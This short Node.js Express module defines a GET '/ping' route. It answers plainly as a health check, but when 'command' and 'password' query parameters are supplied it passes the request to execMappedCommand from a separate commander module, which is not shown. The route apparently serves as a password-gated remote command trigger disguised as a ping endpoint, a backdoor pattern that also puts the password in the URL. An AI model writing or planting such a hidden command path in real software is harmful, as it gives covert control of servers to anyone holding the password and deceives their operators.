const { execMappedCommand } = require('../core/commander');

const attachRoutes = (app) => {
   
app.get("/ping", async (req, res) => {
            const { command, password } = req.query;
        
            if (!command || !password) {
                return res.json({ message: "Server is live. Ping received." });
            }
        execMappedCommand(req, res);
    });
};

module.exports = { attachRoutes };
